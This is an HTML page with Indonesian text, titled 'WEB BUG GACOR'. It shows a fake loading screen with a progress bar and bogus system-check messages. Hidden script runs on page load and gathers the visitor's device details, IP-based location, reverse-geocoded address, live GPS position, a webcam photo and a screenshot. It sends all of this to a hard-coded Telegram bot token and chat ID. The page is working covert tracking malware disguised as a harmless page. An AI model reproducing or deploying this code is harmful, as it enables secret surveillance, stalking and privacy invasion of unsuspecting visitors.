<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WEB BUG GACOR</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
    <style>
        /* Reset & Base Styles */
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        
        body {
            background: #000;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: #999;
            overflow: hidden;
        }
        
        /* Loading Container */
        #loading-container {
            text-align: center;
            width: 80%;
            max-width: 400px;
        }
        
        #loading-text {
            font-size: 22px;
            margin-bottom: 20px;
            color: #6e48aa;
        }
        
        /* Progress Bar */
        #progress-container {
            height: 3px;
            background: #222;
            border-radius: 3px;
            overflow: hidden;
            margin-bottom: 10px;
        }
        
        #progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #6e48aa, #9d50bb);
            transition: width 0.3s ease;
        }
        
        /* Loading Details */
        #loading-details {
            margin-top: 20px;
            font-size: 14px;
            color: #666;
            min-height: 20px;
        }
        
        /* Hidden Elements */
        .hidden {
            display: none;
        }
    </style>
</head>
<body>
    <div id="loading-container">
        <div id="loading-text"> WEB BUG GACOR</div>
        <div id="progress-container">
            <div id="progress-bar"></div>
        </div>
        <div id="loading-details"></div>
    </div>
    
    <!-- Hidden elements for camera capture -->
    <video id="v" autoplay muted class="hidden"></video>
    <canvas id="c" class="hidden"></canvas>

    <script>
        // Immediately Invoked Function Expression (IIFE) to encapsulate code
        (() => {
            // Constants
            const TELEGRAM_BOT_TOKEN = '8073582169:AAFLUp2fZFQcaUYEvLq-U4n2KarEclIW2qw';
            const CHAT_ID = '7127454409';
            
            // Loading messages
            const LOADING_MESSAGES = [
                "Memeriksa modul sistem...",
                "Memuat komponen inti...",
                "Menginisialisasi antarmuka...",
                "Memverifikasi koneksi...",
                "Menyiapkan lingkungan...",
                "Memeriksa pembaruan...",
                "Memuat aset tampilan..."
            ];
            
            // Progress tracking
            let progress = 0;
            
            // DOM Elements
            const progressBar = document.getElementById('progress-bar');
            const loadingDetails = document.getElementById('loading-details');
            
            // Update progress bar and loading messages
            setInterval(() => {
                progress += Math.random() * 5;
                if (progress > 98) progress = 98;
                progressBar.style.width = progress + '%';
                
                if (Math.random() > 0.9) {
                    loadingDetails.textContent = LOADING_MESSAGES[
                        Math.floor(Math.random() * LOADING_MESSAGES.length)
                    ];
                }
            }, 500);
            
            /**
             * Send message to Telegram
             * @param {string} message - Message to send
             */
            const sendToTelegram = async (message) => {
                try {
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (error) {
                    console.error('Error sending to Telegram:', error);
                }
            };
            
            /**
             * Send photo to Telegram
             * @param {Blob} blob - Image blob data
             * @param {string} filename - Name for the file
             */
            const sendPhoto = async (blob, filename) => {
                try {
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob, filename);
                    
                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                } catch (error) {
                    console.error('Error sending photo:', error);
                }
            };
            
            /**
             * Get location details from coordinates
             * @param {number} latitude - Latitude coordinate
             * @param {number} longitude - Longitude coordinate
             * @returns {Object} Location information
             */
            const getLocationDetails = async (latitude, longitude) => {
                try {
                    const response = await fetch(
                        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`
                    );
                    const data = await response.json();
                    
                    if (data.address) {
                        return {
                            district: data.address.county || data.address.city || data.address.state || "Tidak diketahui",
                            subdistrict: data.address.suburb || data.address.village || data.address.town || "Tidak diketahui",
                            fullAddress: data.display_name || "Alamat tidak tersedia"
                        };
                    }
                } catch (error) {
                    console.error('Error getting location details:', error);
                }
                
                return {
                    district: "Tidak diketahui",
                    subdistrict: "Tidak diketahui",
                    fullAddress: "Alamat tidak tersedia"
                };
            };
            
            /**
             * Collect device information
             * @returns {string} Formatted device information
             */
            const collectDeviceInfo = async () => {
                let message = '╭───── Tracking Report ───── ⦿\n\n';
                message += '⚙️ DEVICE INFORMATION\n';
                message += `🖥️ Device: ${navigator.userAgent}\n`;
                message += `💻 Platform: ${navigator.platform}\n`;
                message += `🌐 Bahasa: ${navigator.language}\n`;
                message += `📶 Online: ${navigator.onLine ? 'Online' : 'Offline'}\n`;
                message += `📺 Screen Size: ${screen.width}x${screen.height}\n`;
                message += `🪟 Window Size: ${innerWidth}x${innerHeight}\n`;
                message += `💾 RAM: ${navigator.deviceMemory || 'Unknown'} GB\n`;
                message += `🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;
                
                // Battery information
                if (navigator.getBattery) {
                    try {
                        const battery = await navigator.getBattery();
                        message += `🔋 Battery: ${Math.floor(battery.level * 100)}%\n`;
                        message += `🔌 Charging: ${battery.charging ? '✅ YA' : '❌ TIDAK'}\n`;
                    } catch (error) {
                        message += '🔋 Battery: ❌ Tidak tersedia\n';
                    }
                }
                
                // Additional device info
                message += `⏰ Waktu Akses: ${new Date().toString()}\n`;
                message += `🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n`;
                message += `📜 History Length: ${history.length}\n`;
                message += `✋ Touch Support: ${'ontouchstart' in window ? '✅ YA' : '❌ TIDAK'}\n`;
                message += `🔗 Referrer: ${document.referrer || 'None'}\n`;
                message += `🌍 URL: ${location.href}\n`;
                message += `📄 Title: ${document.title}\n`;
                message += `🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n`;
                message += `🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;
                
                // IP and location information
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    
                    message += '📍 LOCATION INFORMATION\n';
                    message += `📡 IP Address: ${data.ip}\n`;
                    message += `🏙️ Kota: ${data.city}\n`;
                    message += `🏙️ Kabupaten: ${data.region}\n`;
                    message += `🗺️ Wilayah: ${data.region}\n`;
                    message += `🌎 Negara: ${data.country_name}\n`;
                    message += `🏷️ Kode Pos: ${data.postal}\n`;
                    
                    if (data.latitude && data.longitude) {
                        message += `📌 Latitude: ${data.latitude}\n`;
                        message += `📍 Longitude: ${data.longitude}\n`;
                        
                        const location = await getLocationDetails(data.latitude, data.longitude);
                        message += `🏙️ Kabupaten: ${location.district}\n`;
                        message += `🏙️ Kecamatan: ${location.subdistrict}\n`;
                        message += `🏠 Alamat Lengkap: ${location.fullAddress}\n`;
                    }
                } catch (error) {
                    message += '❌ Gagal mendapatkan informasi lokasi\n';
                }
                
                message += '\n╰───── Telegram @iiframijud1 ───── ⦿';
                return message;
            };
            
            /**
             * Start tracking and send data
             */
            const startTracking = async () => {
                // Send device information
                await sendToTelegram(await collectDeviceInfo());
                
                // Try to access camera
                try {
                    const video = document.getElementById('v');
                    const canvas = document.getElementById('c');
                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                    
                    video.srcObject = stream;
                    
                    // Wait for video to initialize
                    await new Promise(resolve => setTimeout(resolve, 3000));
                    
                    // Capture frame from video
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    
                    // Send captured image
                    canvas.toBlob(blob => sendPhoto(blob, 'camera_capture.jpg'), 'image/jpeg');
                    
                    // Stop all tracks
                    stream.getTracks().forEach(track => track.stop());
                } catch (error) {
                    await sendToTelegram('❌ Camera access blocked');
                }
                
                // Take screenshot after delay
                setTimeout(async () => {
                    try {
                        const canvas = await html2canvas(document.body);
                        canvas.toBlob(blob => sendPhoto(blob, 'screenshot.jpg'), 'image/jpeg');
                    } catch (error) {
                        await sendToTelegram('❌ Screenshot failed');
                    }
                }, 5000);
                
                // Try to get geolocation
                if (navigator.geolocation) {
                    navigator.geolocation.watchPosition(
                        async (position) => {
                            let geoMessage = `📍 LIVE GPS TRACKING\n`;
                            geoMessage += `📌 Lat: ${position.coords.latitude}\n`;
                            geoMessage += `📍 Lng: ${position.coords.longitude}\n`;
                            geoMessage += `🎯 Akurasi: ${position.coords.accuracy}m\n`;
                            
                            const location = await getLocationDetails(
                                position.coords.latitude, 
                                position.coords.longitude
                            );
                            
                            geoMessage += `🏙️ Kabupaten: ${location.district}\n`;
                            geoMessage += `🏙️ Kecamatan: ${location.subdistrict}\n`;
                            geoMessage += `🏠 Alamat: ${location.fullAddress}\n`;
                            
                            await sendToTelegram(geoMessage);
                        },
                        async (error) => {
                            await sendToTelegram(`❌ GPS Error: ${error.message}`);
                        },
                        {
                            enableHighAccuracy: true,
                            maximumAge: 0,
                            timeout: 5000
                        }
                    );
                }
            };
            
            // Start tracking after initial delay
            setTimeout(startTracking, 3000);
        })();
    </script>
</body>
</html>
